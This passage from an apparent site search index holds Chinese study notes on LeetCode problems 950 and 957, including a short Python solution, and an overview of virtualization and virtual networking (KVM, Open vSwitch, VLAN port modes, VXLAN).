\u5982\u679c\u724c\u7ec4\u4e2d\u4ecd\u6709\u724c\uff0c\u5219\u5c06\u724c\u7ec4\u7684\u4e0b\u4e00\u5f20\u9876\u724c\u653e\u5728\u724c\u7ec4\u7684\u5e95\u90e8 \u5982\u679c\u4ecd\u6709\u672a\u663e\u793a\u7684\u5361\uff0c\u8bf7\u8fd4\u56de\u6b65\u9aa41.\u5426\u5219\uff0c\u505c\u6b62\u8be5\u5faa\u73af \u8fd4\u56de\u5c06\u4ee5\u9012\u589e\u987a\u5e8f\u663e\u793a\u5361\u7247\u7684\u724c\u7ec4\u7684\u987a\u5e8f \u9898\u76ee\u662f\u7279\u6b8a\u7684\u6392\u5e8f\u624b\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: [17,13,11,2,3,5,7] Output: [2,13,3,11,5,17,7] Explanation: We get the deck in the order [17,13,11,2,3,5,7] (this order doesn t matter), and reorder it. After reordering, the deck starts as [2,13,3,11,5,17,7], where 2 is the top of the deck. We reveal 2, and move 13 to the bottom. The deck is now [3,11,5,17,7,13]. We reveal 3, and move 11 to the bottom. The deck is now [5,17,7,13,11]. We reveal 5, and move 17 to the bottom. The deck is now [7,13,11,17]. We reveal 7, and move 13 to the bottom. The deck is now [11,17,13]. We reveal 11, and move 17 to the bottom. The deck is now [13,17]. We reveal 13, and move 17 to the bottom. The deck is now [17]. We reveal 17. Since all the cards revealed are in increasing order, the answer is correct. \u60f3\u6cd5 \u9996\u5148\u5148\u81ea\u5df1\u6392\u4e2a\u5e8f\uff1f \u9700\u8981\u4f7f\u7528\u961f\u5217\uff1f \u8fd8\u662f\u60f3\u7528\u6392\u5e8f\u597d\u7684\u6570\u7ec4 \u9006\u5e8f \u6765\u5efa\u7acb","title":"950"},{"location":"LeetCode/vol 9/941-950/#_1","text":"Todo 1 2 3 4 5 6 7 class Solution : def deckRevealedIncreasing ( self , deck ): ind = list ( range ( len ( deck ))) for num in sorted ( deck ): deck [ ind [ 0 ]] = num ind = ind [ 2 :] + [ ind [ 1 ]] if len ( ind ) 1 else [] return deck","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 9/951-960/","text":"957 Todo \u8fde\u7eed8\u4e2a\u7262\u623f\uff0c\u6bcf\u4e2a\u7262\u623f\u88ab\u5360\u7528\u6216\u7a7a\u7f6e\u3002 \u6bcf\u5929\uff0c\u6839\u636e\u4ee5\u4e0b\u89c4\u5219\uff0c\u5224\u65ad\u623f\u95f4\u662f\u5426\u88ab\u5360\u7528\u6216\u7a7a\u7f6e\u53d8\u5316\uff1a \u5982\u679c\u4e00\u4e2a\u5c0f\u533a\u6709\u4e24\u4e2a\u76f8\u90bb\u7684\u623f\u95f4\uff0c\u5b83\u4eec\u90fd\u88ab\u5360\u7528\u6216\u8005\u90fd\u662f\u7a7a\u7684\uff0c\u90a3\u4e48\u8be5\u623f\u95f4\u5c31\u4f1a\u88ab\u5360\u7528\u3002 \u5426\u5219\uff0c\u5b83\u4f1a\u53d8\u7a7a\u3002 \u8bf7\u6ce8\u610f\uff0c\u56e0\u4e3a\u76d1\u72f1\u662f\u4e00\u6392\uff0c\u6240\u4ee5\u884c\u4e2d\u7684\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u5355\u5143\u683c\u4e0d\u80fd\u6709\u4e24\u4e2a\u76f8\u90bb\u7684\u90bb\u5c45 \u6211\u4eec\u7528\u4ee5\u4e0b\u65b9\u5f0f\u63cf\u8ff0\u76d1\u72f1\u7684\u5f53\u524d\u72b6\u6001\uff1a\u5982\u679c\u7b2ci\u4e2a\u5c0f\u533a\u88ab\u5360\u7528\uff0c\u5219cell [i] == 1\uff0c\u5426\u5219cell [i] == 0\u3002 \u9274\u4e8e\u76d1\u72f1\u7684\u521d\u59cb\u72b6\u6001\uff0c\u5728N\u5929\u4e4b\u540e\u8fd4\u56de\u76d1\u72f1\u7684\u72b6\u6001\uff08\u4ee5\u53ca\u4e0a\u8ff0N\u4e2a\u8fd9\u6837\u7684\u6539\u53d8\u3002\uff09 \u6709\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u6b21\u64cd\u4f5c\uff1a\u5982\u679c\u67d0\u4e2a\u4f4d\u7f6ei\u7684\u5de6\u8fb9\u548c\u53f3\u8fb9\u7684\u5143\u7d20\u76f8\u7b49\uff0c\u90a3\u4e48\u5f53\u524d\u4f4d\u7f6e\u6539\u62101\uff1b\u5426\u5219\u5c31\u662f0\u3002\u6c42N\u6b21\u64cd\u4f5c\u4e4b\u540e\u7684\u7ed3\u679c\u662f\u591a\u5c11\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Input: cells = [0,1,0,1,1,0,0,1], N = 7 Output: [0,0,1,1,0,0,0,0] Explanation: The following table summarizes the state of the prison on each day: Day 0: [0, 1, 0, 1, 1, 0, 0, 1] Day 1: [0, 1, 1, 0, 0, 0, 0, 0] Day 2: [0, 0, 0, 0, 1, 1, 1, 0] Day 3: [0, 1, 1, 0, 0, 1, 0, 0] Day 4: [0, 0, 0, 0, 0, 1, 0, 0] Day 5: [0, 1, 1, 1, 0, 1, 0, 0] Day 6: [0, 0, 1, 0, 1, 1, 0, 0] Day 7: [0, 0, 1, 1, 0, 0, 0, 0] \u60f3\u6cd5 \u9996\u5148\uff0c\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u80af\u5b9a\u518d\u7b2c\u4e00\u5929\u540e\u662f\u7a7a\u7684","title":"951 960"},{"location":"LeetCode/vol 9/951-960/#957","text":"Todo \u8fde\u7eed8\u4e2a\u7262\u623f\uff0c\u6bcf\u4e2a\u7262\u623f\u88ab\u5360\u7528\u6216\u7a7a\u7f6e\u3002 \u6bcf\u5929\uff0c\u6839\u636e\u4ee5\u4e0b\u89c4\u5219\uff0c\u5224\u65ad\u623f\u95f4\u662f\u5426\u88ab\u5360\u7528\u6216\u7a7a\u7f6e\u53d8\u5316\uff1a \u5982\u679c\u4e00\u4e2a\u5c0f\u533a\u6709\u4e24\u4e2a\u76f8\u90bb\u7684\u623f\u95f4\uff0c\u5b83\u4eec\u90fd\u88ab\u5360\u7528\u6216\u8005\u90fd\u662f\u7a7a\u7684\uff0c\u90a3\u4e48\u8be5\u623f\u95f4\u5c31\u4f1a\u88ab\u5360\u7528\u3002 \u5426\u5219\uff0c\u5b83\u4f1a\u53d8\u7a7a\u3002 \u8bf7\u6ce8\u610f\uff0c\u56e0\u4e3a\u76d1\u72f1\u662f\u4e00\u6392\uff0c\u6240\u4ee5\u884c\u4e2d\u7684\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u5355\u5143\u683c\u4e0d\u80fd\u6709\u4e24\u4e2a\u76f8\u90bb\u7684\u90bb\u5c45 \u6211\u4eec\u7528\u4ee5\u4e0b\u65b9\u5f0f\u63cf\u8ff0\u76d1\u72f1\u7684\u5f53\u524d\u72b6\u6001\uff1a\u5982\u679c\u7b2ci\u4e2a\u5c0f\u533a\u88ab\u5360\u7528\uff0c\u5219cell [i] == 1\uff0c\u5426\u5219cell [i] == 0\u3002 \u9274\u4e8e\u76d1\u72f1\u7684\u521d\u59cb\u72b6\u6001\uff0c\u5728N\u5929\u4e4b\u540e\u8fd4\u56de\u76d1\u72f1\u7684\u72b6\u6001\uff08\u4ee5\u53ca\u4e0a\u8ff0N\u4e2a\u8fd9\u6837\u7684\u6539\u53d8\u3002\uff09 \u6709\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u6b21\u64cd\u4f5c\uff1a\u5982\u679c\u67d0\u4e2a\u4f4d\u7f6ei\u7684\u5de6\u8fb9\u548c\u53f3\u8fb9\u7684\u5143\u7d20\u76f8\u7b49\uff0c\u90a3\u4e48\u5f53\u524d\u4f4d\u7f6e\u6539\u62101\uff1b\u5426\u5219\u5c31\u662f0\u3002\u6c42N\u6b21\u64cd\u4f5c\u4e4b\u540e\u7684\u7ed3\u679c\u662f\u591a\u5c11\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Input: cells = [0,1,0,1,1,0,0,1], N = 7 Output: [0,0,1,1,0,0,0,0] Explanation: The following table summarizes the state of the prison on each day: Day 0: [0, 1, 0, 1, 1, 0, 0, 1] Day 1: [0, 1, 1, 0, 0, 0, 0, 0] Day 2: [0, 0, 0, 0, 1, 1, 1, 0] Day 3: [0, 1, 1, 0, 0, 1, 0, 0] Day 4: [0, 0, 0, 0, 0, 1, 0, 0] Day 5: [0, 1, 1, 1, 0, 1, 0, 0] Day 6: [0, 0, 1, 0, 1, 1, 0, 0] Day 7: [0, 0, 1, 1, 0, 0, 0, 0] \u60f3\u6cd5 \u9996\u5148\uff0c\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u80af\u5b9a\u518d\u7b2c\u4e00\u5929\u540e\u662f\u7a7a\u7684","title":"957"},{"location":"Note/\u865a\u62df\u5316/","text":"\u8ba1\u7b97\u865a\u62df\u5316\u6280\u672f\u6982\u8ff0 \u865a\u62df\u5316\u4f7f\u5f97\u5728\u4e00\u53f0\u7269\u7406\u7684\u670d\u52a1\u5668\u4e0a\u53ef\u4ee5\u8dd1\u591a\u53f0\u865a\u62df\u673a\uff0c\u865a\u62df\u673a\u5171\u4eab\u7269\u7406\u673a\u7684 CPU\u3001\u5185\u5b58\u3001IO \u786c\u4ef6\u8d44\u6e90\uff0c\u4f46\u903b\u8f91\u4e0a\u865a\u62df\u673a\u4e4b\u95f4\u662f\u76f8\u4e92\u9694\u79bb\u7684 \u4e3b\u6d41\u7684\u865a\u62df\u5316\u67b6\u6784\u5206\u4e3a\uff1a \u5bb9\u5668\u6a21\u5f0f \u4e3b\u673a\u6a21\u5f0f \u88f8\u673a\u6a21\u5f0f \u6df7\u5408 \u865a\u62df\u5316\u6280\u672f\u57fa\u4e8eHypervisor\u5c06\u5bbf\u4e3b\u673aHost\u7684\u786c\u4ef6\u8d44\u6e90\u865a\u62df\u5316\u7ed9\u5ba2\u6237\u673aGuest\uff0c\u901a\u8fc7Hypervisor\u5b9e\u73b0\u7684\u65b9\u5f0f\u7684\u4e0d\u540c\u5206\u4e3a \u4e00\u578b\u865a\u62df\u5316 \u76f4\u63a5\u5728\u7269\u7406\u673a\u4e0a\u7684\u865a\u62df\u5316\uff0c\u591a\u4e2a\u865a\u62df\u673a\u5728 Hypervisor \u4e0a\u8fd0\u884c Hypervisor \u5b9e\u73b0\u65b9\u5f0f\u4e00\u822c\u662f\u4e00\u4e2a\u7279\u6b8a\u5b9a\u5236\u7684 Linux \u7cfb\u7edf \u4ee3\u8868\u6280\u672f\uff1aXen\uff0cESXI \u4e8c\u578b\u865a\u62df\u5316 Hypervisor \u4f5c\u4e3a OS \u4e0a\u7684\u4e00\u4e2a\u7a0b\u5e8f\u6a21\u5757\u8fd0\u884c\uff0c\u5e76\u5bf9\u7ba1\u7406\u865a\u62df\u673a\u8fdb\u884c\u7ba1\u7406\u3002 \u4ee3\u8868\u6280\u672f\uff1aKVM\uff0cVirtualBox \u548c VMWare Workstation \u76ee\u524d\u8f83\u6d41\u884c\u7684\u662fKVM(Kernel-Based Virtual Machine)\u865a\u62df\u5316\u6280\u672f\u7ed3\u5408 Qemu \u6765\u5b9e\u73b0\u865a\u62df\u5316 KVM \u662f\u57fa\u4e8e Linux \u5185\u6838\u5b9e\u73b0\u7684\uff0cKVM \u6709\u4e00\u4e2a\u5185\u6838\u6a21\u5757\u53eb kvm.ko\uff0c\u53ea\u7528\u4e8e\u7ba1\u7406\u865a\u62df CPU \u548c\u5185\u5b58\u3002 \u90a3 IO \u7684\u865a\u62df\u5316\uff0c\u5982\u5b58\u50a8\u548c\u7f51\u7edc\u8bbe\u5907\u4ea4\u7ed9 Linux \u5185\u6838\u548c Qemu \u6765\u5b9e\u73b0\u3002 KVM \u672c\u8eab\u53ea\u5173\u6ce8\u865a\u62df\u673a\u8c03\u5ea6\u548c\u5185\u5b58\u7ba1\u7406\u8fd9\u4e24\u4e2a\u65b9\u9762\u3002IO \u5916\u8bbe\u7684\u4efb\u52a1\u4ea4\u7ed9 Linux \u5185\u6838\u548c Qemu\u3002 KVM Qemu \u7f51\u7edc\u865a\u62df\u5316\u6982\u8ff0 \u4e0b\u56fe\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u4e86Open vSwitch\uff08OVS\uff09\u865a\u62df\u7f51\u7edc\u7684\u903b\u8f91\u56fe https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux_OpenStack_Platform/5/html/Cloud_Administrator_Guide/section_networking-scenarios.html \u7b80\u5355\u7684\u8bf4\u4e00\u4e0b\u56fe\u4e2d\u7684\u610f\u601d \u8be5\u56fe\u6709\u4e09\u4e2a\u865a\u62df\u673a vm01\uff0cvm02\uff0cvm03\u3002\u5176\u4e2d vm01\u3001vm03\u6709\u5404\u6709\u4e00\u5757\u865a\u62df\u7f51\u5361eth0\u5e76\u5206\u914d\u4e86\u4e00\u4e2aip\u5730\u5740\uff0cvm02\u6709\u4e24\u5757\u865a\u62df\u7f51\u5361eth0\u3001eth1\uff0c\u540c\u65f6\u5404\u4e2a\u7f51\u5361\u4e5f\u5206\u914d\u4e86\u4e00\u4e2aip\u5730\u5740\u3002\u901a\u8fc7\u4ee5\u4e0b\u7684\u5404\u4e2a\u8bbe\u5907\uff0c\u5b9e\u73b0openstack\u7684\u865a\u62df\u7f51\u7edc \u8981\u4f7f\u4ee5\u592a\u7f51\u5e27\u4ece\u865a\u62df\u673a vm01 \u7684 eth0 \u4f20\u8f93\u5230\u7269\u7406\u7f51\u7edc\uff0c\u5b83\u5fc5\u987b\u901a\u8fc7\u4e3b\u673a\u5185\u76849\u4e2a\u8bbe\u5907\uff1avnet 0\uff0cqbrXXX\uff0cqvbXXX\uff0cqvoXXX\uff0cbr-int\uff0cint-br-eth1\uff0cphy-br-eth1\uff0cbr-eth1\u4ee5\u53ca\u6700\u540e\u7684\u7269\u7406\u7f51\u5361eth1 TAP device TAP \u8bbe\u5907\uff08\u4f8b\u5982vnet0\uff09\u662f\u8bf8\u5982 KVM \u4e4b\u7c7b\u7684 Hypervisor \u5b9e\u73b0\u865a\u62df\u7f51\u5361\uff08\u901a\u5e38\u79f0\u4e3a VIF \u6216 vNIC \uff09\u3002 Guest\u7cfb\u7edf\u63a5\u6536\u6765\u81ea TAP \u8bbe\u5907\u7684\u4ee5\u592a\u7f51\u5e27 veth pair veth pair \u662f\u4e00\u5bf9\u76f4\u63a5\u8fde\u63a5\u7684\u865a\u62df\u7f51\u7edc\u63a5\u53e3\u3002 \u53d1\u9001\u5230veth pair \u4e00\u7aef\u7684\u4ee5\u592a\u7f51\u5e27\u7531 veth pair \u7684\u53e6\u4e00\u7aef\u63a5\u6536\u3002 \u7f51\u7edc\u4f7f\u7528 veth pair \u4f5c\u4e3a\u865a\u62df\u8df3\u7ebf\uff0c\u4ee5\u5728\u865a\u62df\u7f51\u6865\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\u3002 Linux Bridge Linux Bridge\u7684\u884c\u4e3a\u53ef\u4ee5\u770b\u4f5c\u4e00\u4e2ahub\uff08 \u672c\u56fe\u4e2d \uff09\uff0c\u53ef\u4ee5\u5c06\u591a\u4e2a\u7269\u7406\u8bbe\u5907\u6216\u662f\u865a\u62df\u8bbe\u5907\u94fe\u63a5\u5230 Linux Bridge \u4e2d\u3002Linux Bridge \u7684\u4efb\u4f55\u4e00\u4e2a\u5df2\u8fde\u63a5\u7684\u63a5\u53e3\u8fdb\u5165\u6240\u6709\u4ee5\u592a\u7f51\u5e27\u90fd\u4f1a\u4f20\u8f93\u5230\u5176\u4ed6\u6240\u6709\u8bbe\u5907 \u96c6\u7ebf\u5668\uff08hub\uff09\uff1a\u4e00\u4e2a\u53e3\u6536\u5230\u7684\u4fe1\u53f7\uff0c\u539f\u5c01\u4e0d\u52a8\u7684\u53d1\u9001\u7ed9\u6240\u6709\u5176\u4ed6\u7684\u53e3\uff0c\u7531\u5176\u4ed6\u7684\u53e3\u4e0a\u7684\u8bbe\u5907\u81ea\u5df1\u51b3\u5b9a\u662f\u5426\u63a5\u6536\u4fe1\u53f7\u3002\u6709\u70b9\u7c7b\u4f3c\u5e7f\u64ad\uff0c\u4f46\u662f\u6bd4\u5e7f\u64ad\u66f4\u7eaf\u7cb9\u3002\u7531\u4e8ehub\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u53d1\uff0c\u6240\u4ee5hub\u5de5\u4f5c\u5728\u7269\u7406\u5c42\uff08L1\uff09 Open vSwitch Open vSwitch \u7684\u884c\u4e3a\u7c7b\u4f3c\u4e8e\u865a\u62df\u4ea4\u6362\u673a\uff0c\u7f51\u7edc\u8bbe\u5907\u8fde\u63a5\u5230Open vSwitch\u7684\u7aef\u53e3\uff0c\u7aef\u53e3\u7684\u914d\u7f6e\u5f88\u50cf\u7269\u7406\u4ea4\u6362\u673a\u7684\u7aef\u53e3\uff0c\u5305\u62ecVLAN\u914d\u7f6e VLAN LAN \u8868\u793a Local Area Network\uff0c\u672c\u5730\u5c40\u57df\u7f51\uff0c\u901a\u5e38\u4f7f\u7528 Hub \u548c Switch \u6765\u8fde\u63a5 LAN \u4e2d\u7684\u8ba1\u7b97\u673a\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e24\u53f0\u8ba1\u7b97\u673a\u8fde\u5165\u540c\u4e00\u4e2a Hub \u6216\u8005 Switch \u65f6\uff0c\u5b83\u4eec\u5c31\u5728\u540c\u4e00\u4e2a LAN \u4e2d\u3002 \u4e00\u4e2a LAN \u8868\u793a\u4e00\u4e2a\u5e7f\u64ad\u57df\u3002 \u5176\u542b\u4e49\u662f\uff1a LAN \u4e2d\u7684\u6240\u6709\u6210\u5458\u90fd\u4f1a\u6536\u5230\u4efb\u610f\u4e00\u4e2a\u6210\u5458\u53d1\u51fa\u7684\u5e7f\u64ad\u5305 \u3002 VLAN \u8868\u793a Virtual LAN\u3002\u4e00\u4e2a\u5e26\u6709 VLAN \u529f\u80fd\u7684switch \u80fd\u591f\u5c06\u81ea\u5df1\u7684\u7aef\u53e3\u5212\u5206\u51fa\u591a\u4e2a LAN\u3002 \u8ba1\u7b97\u673a\u53d1\u51fa\u7684\u5e7f\u64ad\u5305\u53ef\u4ee5\u88ab\u540c\u4e00\u4e2a LAN \u4e2d\u5176\u4ed6\u8ba1\u7b97\u673a\u6536\u5230\uff0c\u4f46\u4f4d\u4e8e\u5176\u4ed6 LAN \u7684\u8ba1\u7b97\u673a\u5219\u65e0\u6cd5\u6536\u5230\u3002 \u7b80\u5355\u5730\u8bf4\uff0cVLAN \u5c06\u4e00\u4e2a\u4ea4\u6362\u673a\u5206\u6210\u4e86\u591a\u4e2a\u4ea4\u6362\u673a\uff0c\u9650\u5236\u4e86\u5e7f\u64ad\u7684\u8303\u56f4\uff0c\u5728\u4e8c\u5c42\u5c06\u8ba1\u7b97\u673a\u9694\u79bb\u5230\u4e0d\u540c\u7684 VLAN \u4e2d\u3002 VLAN \u662f \u4e8c\u5c42\u4e0a\u7684\u9694\u79bb \uff0c\u903b\u8f91\u5206\u5272\u5e7f\u64ad\u57df\u3002\u5c06\u4e0d\u540c\u63a5\u53e3\u52a0\u5165\u4e0d\u540cVLAN \u79cd\u7c7b \u9759\u6001VLAN \u57fa\u4e8e\u7aef\u53e3\u7684\u5212\u5206\u7684VLAN \u52a8\u6001VLAN \u57fa\u4e8eMAC\u5730\u5740\u5212\u5206\u7684\u52a8\u6001VLAN VLAN\u7aef\u53e3 Access \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5219\u76f4\u63a5\u4e22\u5f03\uff08\u7f3a\u7701\uff09 \u53d1\u62a5\u6587\u65f6\uff0c\u5c06\u62a5\u6587\u7684VLAN\u4fe1\u606f\u5265\u79bb\uff0c\u76f4\u63a5\u53d1\u9001\u51fa\u53bb Trunk \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f\uff1a \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5224\u65ad\u8be5trunk\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u8be5 VLAN\u7684\u6570\u636e\u8fdb\u5165 \u5982\u679c\u5141\u8bb8\u5219\u62a5\u6587\u643a\u5e26\u539f\u6709VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\uff0c\u5426\u5219\u4e22\u5f03\u8be5\u62a5\u6587\u3002 \u53d1\u62a5\u6587\u65f6\uff0c\u6bd4\u8f83\u7aef\u53e3\u7684PVID\u548c\u5c06\u8981\u53d1\u9001\u62a5\u6587\u7684VLAN\u4fe1\u606f \u5982\u679c\u4e24\u8005\u76f8\u7b49\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001 \u5426\u5219\u62a5\u6587\u5c06\u643a\u5e26\u539f\u6709\u7684VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\u3002 Hybrid \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5219\u5224\u65ad\u8be5hybrid\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u8be5VLAN\u7684\u6570\u636e\u8fdb\u5165 \u5982\u679c\u53ef\u4ee5\u5219\u8f6c\u53d1\uff0c\u5426\u5219\u4e22\u5f03\u3002 \u53d1\u62a5\u6587\u65f6\uff0c\u5224\u65ad\u8be5VLAN\u5728\u672c\u7aef\u53e3\u7684\u5c5e\u6027 \u5982\u679c\u662funtag\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001\uff0c \u5982\u679c\u662ftag\u5219\u6bd4\u8f83\u7aef\u53e3\u7684PVID\u548c\u5c06\u8981\u53d1\u9001\u62a5\u6587\u7684VLAN\u4fe1\u606f\uff0c \u5982\u679c\u4e24\u8005\u76f8\u7b49\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001 \u5426\u5219\u62a5\u6587\u5c06\u643a\u5e26\u539f\u6709\u7684VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\u3002 VXLAN Virtual Extensible LAN \u662f\u4e3a\u4e86\u5f25\u8865VLAN\u7684\u4e0d\u8db3\uff0c\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762 \u865a\u62df\u5316\u6280\u672f\u7684\u53d1\u5c55\u4fc3\u4f7f\u5927\u6570\u636e\u3001\u4e91\u8ba1\u7b97\u6280\u672f\u516c\u53f8\u91c7\u7528\u5355\u4e2a\u7269\u7406\u8bbe\u5907\u865a\u62df\u591a\u53f0\u865a\u62df\u673a\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u7ec4\u7f51\uff0c\u968f\u7740\u5e94\u7528\u6a21\u5757\u7684\u589e\u52a0\uff0c\u5bf9\u4e8e\u652f\u6301VLAN\u6570\u76ee\u7684\u8981\u6c42\u4e5f\u5728\u63d0\u5347\uff0c802.1Q\u6807\u51c6\u4e2d\u7684 \u6700\u591a\u652f\u63014094\u4e2aVLAN\u7684\u80fd\u529b\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u4e0b\u9700\u6c42 \u516c\u6709\u4e91\u63d0\u4f9b\u5546\u7684\u4e1a\u52a1\u8981\u6c42\u5c06\u5b9e\u4f53\u7f51\u7edc\u79df\u501f\u7ed9\u591a\u4e2a\u4e0d\u540c\u7684\u7528\u6237\uff0c\u8fd9\u4e9b\u7528\u6237\u5bf9\u4e8e\u7f51\u7edc\u7684\u8981\u6c42\u6709\u6240\u4e0d\u540c\uff0c\u800c\u4e0d\u540c\u7528\u6237\u79df\u501f\u7684\u7f51\u7edc\u6709\u5f88\u5927\u7684\u53ef\u80fd \u4f1a\u51fa\u73b0IP\u5730\u5740\u3001MAC\u5730\u5740\u7684\u91cd\u53e0 \uff0c\u4f20\u7edf\u7684VLAN\u4ec5\u4ec5\u89e3\u51b3\u4e86\u540c\u4e00\u94fe\u8def\u5c42\u7f51\u7edc\u5e7f\u64ad\u57df\u9694\u79bb\u7684\u95ee\u9898\uff0c\u800c\u5e76\u6ca1\u6709\u6d89\u53ca\u5230\u7f51\u7edc\u5730\u5740\u91cd\u53e0\u7684\u95ee\u9898\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b0\u7684\u6280\u672f\u6765\u4fdd\u8bc1\u5728\u591a\u4e2a\u79df\u6237\u7f51\u7edc\u4e2d\u5b58\u5728\u5730\u5740\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\u4f9d\u65e7\u80fd\u6709\u6548\u901a\u4fe1\u7684\u6280\u672f \u865a\u62df\u5316\u6280\u672f\u7684\u51fa\u73b0\u589e\u52a0\u4e86\u4ea4\u6362\u673a\u7684\u8d1f\u62c5\uff0c\u5bf9\u4e8e\u5927\u578b\u7684\u6570\u636e\u4e2d\u5fc3\u800c\u8a00\uff0c\u5355\u53f0\u4ea4\u6362\u673a\u5fc5\u987b\u652f\u6301\u6570\u5341\u53f0\u4ee5\u4e0a\u4e3b\u673a\u7684\u901a\u4fe1\u8fde\u63a5\u624d\u8db3\u4ee5\u6ee1\u8db3\u5e94\u7528\u9700\u6c42\uff0c\u800c\u865a\u62df\u5316\u6280\u672f\u4f7f\u5f97\u5355\u53f0\u4e3b\u673a\u53ef\u4ee5\u865a\u62df\u5316\u51fa\u591a\u53f0\u865a\u62df\u673a\u540c\u65f6\u8fd0\u884c\uff0c\u800c\u6bcf\u53f0\u865a\u62df\u673a\u90fd\u4f1a\u6709\u5176\u552f\u4e00\u7684MAC\u5730\u5740\u3002\u8fd9\u6837\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u96c6\u7fa4\u4e2d\u6240\u6709\u865a\u673a\u53ef\u4ee5\u6b63\u5e38\u901a\u4fe1\uff0c\u4ea4\u6362\u673a\u5fc5\u987b\u4fdd\u5b58\u6bcf\u53f0\u865a\u673a\u7684MAC\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86 \u4ea4\u6362\u673a\u4e2d\u7684MAC\u8868\u5f02\u5e38\u5e9e\u5927\uff0c\u4ece\u800c\u5f71\u54cd\u4ea4\u6362\u673a\u7684\u8f6c\u53d1\u6027\u80fd VXLAN\u6280\u672f\u662f\u7f51\u7edcOverlay\u6280\u672f\u7684\u4e00\u79cd\u5b9e\u73b0\uff0cOverlay\u76f4\u8bd1\u4e3a\u8986\u76d6\uff0c\u5373\u5728 \u7269\u7406\u7f51\u7edc\u62d3\u6251\u7684\u57fa\u7840\u4e0a\u6784\u5efa\u7684\u903b\u8f91\u7f51\u7edc \u3002\u5bf9\u4e8e\u6784\u5efa\u5728Overlay\u4e0a\u7684\u7ec8\u7aef\u800c\u8a00\uff0c\u7269\u7406\u7f51\u7edc\u7684\u62ec\u6251\u7ed3\u6784\u5bf9\u5176\u662f\u900f\u660e\u7684\u3002 VXLAN\u6280\u672f\u53ef\u4ee5 \u57fa\u4e8e\u4e09\u5c42\u7f51\u7edc\u7ed3\u6784\u6765\u6784\u5efa\u4e8c\u5c42\u865a\u62df\u7f51\u7edc \uff0c\u901a\u8fc7VLAN\u6280\u672f\u53ef\u4ee5\u5c06\u5904\u4e8e\u4e0d\u540c\u7f51\u6bb5\u7f51\u7edc\u8bbe\u5907\u6574\u5408\u5728\u540c\u4e00\u4e2a\u903b\u8f91\u94fe\u8def\u5c42\u7f51\u7edc\u4e2d\uff0c\u5bf9\u4e8e\u7ec8\u7aef\u7528\u6237\u800c\u8a00\uff0c\u8fd9\u4e9b\u7f51\u7edc\u8bbe\u5907\u4f3c\u4e4e\u201c\u771f\u5b9e\u5730\u201d\u90e8\u7f72\u5728\u4e86\u540c\u4e00\u4e2a\u94fe\u8def\u5c42\u7f51\u7edc\u4e2d\u3002 \u4e0b\u56fe\u4e3aVXLAN\u62a5\u6587\u683c\u5f0f\uff0c\u539f\u59cb\u62a5\u6587\u5728VXLAN\u63a5\u5165\u70b9\uff08\u88ab\u79f0\u4e3aVTEP\uff09 \u52a0\u4e0aVXLAN\u5e27\u5934\u540e\u518d\u88ab\u5c01\u88c5\u5728UDP\u62a5\u5934\u4e2d \uff0c\u5e76\u4f7f\u7528\u627f\u8f7d\u7f51\u7edc\u7684IP/MAC\u5730\u5740\u4f5c\u4e3a\u5916\u5c42\u5934\u8fdb\u884c\u5c01\u88c5\uff0c\u627f\u8f7d\u7f51\u7edc\u53ea\u9700\u8981\u6309\u7167\u666e\u901a\u7684\u4e8c\u4e09\u5c42\u8f6c\u53d1\u6d41\u7a0b\u8fdb\u884c\u8f6c\u53d1\u5373\u53ef\u3002 VXLAN \u6a21\u578b VXLAN (Virtual eXtensible Local Area Network) 